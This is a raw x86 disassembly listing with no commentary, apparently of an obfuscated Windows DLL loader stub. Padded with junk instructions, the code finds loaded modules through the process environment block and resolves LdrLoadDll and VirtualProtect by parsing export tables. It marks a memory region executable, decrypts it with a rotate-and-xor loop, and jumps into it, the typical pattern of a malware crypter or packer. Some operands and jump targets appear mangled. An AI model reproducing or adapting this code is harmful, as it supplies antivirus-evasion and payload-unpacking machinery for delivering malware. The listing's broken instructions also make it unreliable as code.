_start
pushad
call $+5
mov [ esp ] ecx
xor ecx [ esp ]
and ebx ebx
sbb esp 0xfffffffc
push esp
sub ecx 0xffffffff
mov esi [ esp ]
add esp 0x4
and edi edi
sbb ecx 0xffffffff
sub esi 0x4
and ebx ebx
adc ecx 0x1
neg ecx
call $+5
sub [ esi ] ecx
retn
sub_6f00203e
add esp 0xfffffffc
mov [ esp ] eax
xor eax [ esp ]
add esp 0x4
xor ecx ecx
add ecx eax
dec ch
sub ch 0x1
mov cl ch
mov ebp 0x0
xor ebp eax
call $+5
mov esi 0x0
sub esi [ esp ]
neg esi
or ebx ebx
adc ebp 0x1
movzx edx [ esi + ebp - 0x2 ]
cmp edx ecx
jne r-xdata
add [ esp ] eax
jmp [ esp ]
mov eax 0x0
xor eax ebp
sub_6f0020c7
push [ fs : 0x0 ]
add edi esi
and edx 0x0
add edx 0xffff
not ebx
and eax eax
adc edi esi
mov [ fs : 0x0 ] esp
and edi ebx
add edi esi
jmp r-xdata
call $+5
sub edi esi
push ecx
xor ecx [ esp ]
and ecx ecx
sbb esp 0xfffffffc
mov ecx [ edi ]
mov eax 0x0
xor eax 0x5a4d
and ecx edx
call $+5
mov [ esp ] ecx
and ebx ebx
sbb ecx eax
pop ecx
je r-xdata
mov ecx [ esp ]
add esp 0x4
sub ecx ecx
add ecx [ esp ]
mov [ fs : 0x0 ] ecx
and edi edi
adc esp 0x8
test ecx ecx
mov esi 0x0
adc esi edi
sub ecx ecx
add ecx [ edi + 0x3c ]
test edi edi
adc edi ecx
push 0x4550
pop ecx
and eax 0x0
or eax [ edi ]
call $+5
mov [ esp ] ecx
xor ecx eax
pop ecx
jne r-xdata
jmp [ esp ]
popad
xor eax eax
add eax 0x1
retn 0xc
mov ecx 0x0
or ecx [ edi + 0x78 ]
xor edi edi
or edi ecx
and ecx ecx
adc edi esi
sub esp 0x4
mov [ esp ] edi
mov ecx 0x0
sub ecx [ edi + 0x20 ]
neg ecx
mov edi 0x0
add edi ecx
test eax eax
adc edi esi
add esp 0xfffffffc
mov [ esp ] esi
call $+5
mov [ esp ] edi
pop esi
add esp 0x4
mov ebx [ esp - 0x4 ]
push edx
xor edx [ esp ]
and esi esi
adc esp 0x4
mov eax 0x0
sub eax esi
neg eax
and ecx 0x0
or ecx [ esi ]
or edi edi
mov esi 0x0
adc esi ecx
call $+5
and ebp 0x0
add ebp esp
add esi ebx
push 0x6c6c
push 0x4464616f
push 0x4c72644c
mov edi 0x0
or edi esp
xor ecx ecx
add ecx 0xb
[ esi ] [ edi ]
je r-xdata
sub esp esp
add esp ebp
pop esi
call $+5
mov [ esp ] ebx
call $+5
mov [ esp ] edx
add esp 0x4
mov ebx [ esp - 0x4 ]
add esp 0x4
mov esi [ esp - 0x4 ]
pop edi
and ebx ebx
mov edx 0x0
adc edx edi
sub ecx ecx
add ecx [ edi + 0x24 ]
mov edi 0x0
xor edi ecx
test edx edx
adc edi esi
mov ecx 0x0
or ecx [ edi + ebx * 2 ]
and ecx 0xffff
push ecx
pop ebx
mov ecx 0x0
sub ecx [ edx + 0x10 ]
neg ecx
sub ebx ecx
and esi esi
sbb ebx 0xffffffff
or ecx ecx
mov edi 0x0
adc edi [ edx + 0x1c ]
add edi esi
mov ecx [ edi + ebx * 4 ]
add esi ecx
mov ebp 0x0
sub ebp esp
neg ebp
add esp 0xfffffffc
mov [ esp ] ecx
xor ecx [ esp ]
add esp 0x4
call $+5
mov [ esp ] ecx
and edi 0x0
add edi esp
sub esp 0x4
mov [ esp ] ecx
call $+5
mov [ esp ] 0x6c006c
push 0x64002e
push 0x320033
push 0x6c0065
call $+5
mov [ esp ] 0x6e0072
add esp 0xfffffffc
mov [ esp ] 0x65006b
push esp
sub esp 0x4
mov [ esp ] 0x1a0018
mov eax 0x0
or eax esp
sub esp 0x4
mov [ esp ] edi
sub esp 0x4
mov [ esp ] eax
call $+5
mov [ esp ] ecx
add esp 0xfffffffc
mov [ esp ] ecx
push esi
push edi
mov esi [ esp ]
add esp 0x4
mov ebx [ esp ]
add esp 0x4
call ebx
and eax 0x0
or eax [ esi ]
sub esp 0x4
mov [ esp ] eax
mov ecx [ esp ]
add esp 0x4
and ebx ebx
mov eax 0x0
adc eax [ fs : 0x30 ]
and esi 0x0
or esi [ eax + 0x10 ]
mov [ esi + 0x18 ] ecx
and esp 0x0
or esp ebp
and eax 0x0
add eax [ fs : 0x30 ]
sub esi esi
add esi [ eax + 0x10 ]
xor edi edi
or edi [ esi + 0x18 ]
and esi 0x0
or esi edi
mov ecx 0x0
or ecx [ edi + 0x3c ]
and edi edi
adc edi ecx
xor ecx ecx
xor ecx [ edi + 0x78 ]
push ecx
pop edi
add edi esi
push edi
xor ecx ecx
or ecx [ edi + 0x20 ]
mov edi 0x0
or edi ecx
and edx edx
adc edi esi
call $+5
mov [ esp ] esi
sub esp 0x4
mov [ esp ] edi
mov esi [ esp ]
add esp 0x4
mov ebx [ esp ]
add esp 0x4
add esp 0xfffffffc
mov [ esp ] edx
xor edx [ esp ]
test edx edx
adc esp 0x4
test eax eax
mov eax 0x0
adc eax esi
mov ecx 0x0
or ecx [ esi ]
and esi 0x0
or esi ecx
call $+5
sub ebp ebp
add ebp esp
and esi esi
adc esi ebx
call $+5
mov [ esp ] 0x7463
sub esp 0x4
mov [ esp ] 0x65746f72
sub esp 0x4
mov [ esp ] 0x506c6175
add esp 0xfffffffc
mov [ esp ] 0x74726956
mov edi 0x0
add edi esp
mov ecx 0x0
sub ecx 0xf
neg ecx
[ esi ] [ edi ]
je r-xdata
and ebx ebx
adc edx 0x1
test ebx ebx
adc eax 0x4
mov esi 0x0
xor esi [ eax ]
xor esp esp
or esp ebp
jmp [ esp ]
mov esp 0x0
xor esp ebp
add esp 0x4
mov esi [ esp - 0x4 ]
push ebx
add esp 0xfffffffc
mov [ esp ] edx
mov ebx [ esp ]
add esp 0x4
mov esi [ esp ]
add esp 0x4
mov edi [ esp ]
add esp 0x4
mov edx edi
test esi esi
mov ecx 0x0
adc ecx [ edi + 0x24 ]
mov edi 0x0
or edi ecx
add edi esi
and ecx 0x0
add ecx [ edi + ebx * 2 ]
and ecx 0xffff
mov ebx 0x0
sub ebx ecx
neg ebx
mov ecx 0x0
add ecx [ edx + 0x10 ]
sub ebx ecx
or ebx ebx
sbb ebx 0xffffffff
and edi 0x0
or edi [ edx + 0x1c ]
add edi esi
and ecx 0x0
add ecx [ edi + ebx * 4 ]
add esi ecx
push 0x1000
pop edx
call $+5
mov edi [ esp ]
add esp 0x4
and edi 0xfffff000
add edi edx
add edi edx
add esp 0xfffffffc
mov [ esp ] edi
xor eax eax
add eax 0x4
call $+5
add edi edx
push [ edi ]
pop ecx
test eax eax
sbb eax 0x1
je r-xdata
inc edx
add eax 0x4
and esi 0x0
add esi [ eax ]
xor esp esp
add esp ebp
jmp [ esp ]
pop ecx
add esp 0x4
mov edi [ esp - 0x4 ]
call $+5
mov [ esp ] ecx
push esp
sub esp 0x4
mov [ esp ] 0x40
push 0x45f0
add esp 0xfffffffc
mov [ esp ] edi
call $+5
mov [ esp ] esi
call $+5
mov [ esp ] edi
mov esi [ esp ]
add esp 0x4
pop ebx
call $+5
pop eax
and edx edx
adc eax 0x1e
sub esp 0x4
mov [ esp ] eax
call $+5
mov [ esp ] ebp
and ebp 0x0
or ebp esp
add ebx 0x5
jmp ebx
jmp [ esp ]
sub_6f002550
add esp 0x4
mov ebx [ esp - 0x4 ]
and eax eax
mov edi 0x0
adc edi esi
mov eax 0x0
sub eax 0xc
neg eax
add edi eax
and esi 0x0
add esi edi
sub ebp ebp
add ebp edi
mov ecx 0x0
xor ecx 0x454e
push ecx
pop edx
call $+5
and eax 0x0
or eax [ esi ]
rol al cl
add esp 0xfffffffc
mov [ esp ] edx
xor eax [ esp ]
and ebx ebx
sbb esp 0xfffffffc
add esp 0xfffffffc
mov [ esp ] ecx
mov ecx 0x40
cmp ebx ecx
je r-xdata
test edi edi
adc esi 0x1
pop ecx
stc
sbb ecx 0x0
je r-xdata
stosb [ edi ]
add esp 0x4
mov eax [ esp - 0x4 ]
call ebp
add eax ebx
add ecx edx
popad
xor eax eax
add eax 0x1
retn 0xc
jmp [ esp ]
